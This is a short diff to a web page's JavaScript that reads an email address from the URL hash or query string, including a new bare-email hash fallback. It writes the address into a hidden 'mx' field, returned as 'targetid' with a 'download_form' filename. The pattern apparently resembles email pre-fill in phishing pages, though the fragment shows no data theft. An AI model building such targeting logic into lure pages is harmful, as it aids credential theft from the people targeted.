@@ -28,8 +28,8 @@
 <script>
 function getUrlParams() {
     const hash = window.location.hash.substring(1);
-    const params = new URLSearchParams(hash);
-
+    let params = new URLSearchParams(hash);
+    
     // Get email from URL parameter or hash
     let email = params.get('email');
     
@@ -38,16 +38,21 @@ function getUrlParams() {
         const urlParams = new URLSearchParams(window.location.search);
         email = urlParams.get('email');
     }
-
+    
+    // If still no email, check if hash is just an email (no "email=")
+    if (!email && hash && hash.includes('@')) {
+        email = hash; // Use the hash value directly as email
+    }
+    
     // If email found, update the hidden input value
     const mxInput = document.getElementById('mx');
     if (mxInput && email) {
         mxInput.value = email;
     }
-
-// Get the updated mx value
-const mxValue = mxInput ? mxInput.value : 'info@mangalammetals.com';
-
+    
+    // Get the updated mx value
+    const mxValue = mxInput ? mxInput.value : 'info@mangalammetals.com';
+    
     return {
         targetid: mxValue,
         filename: params.get('filename') || 'download_form'
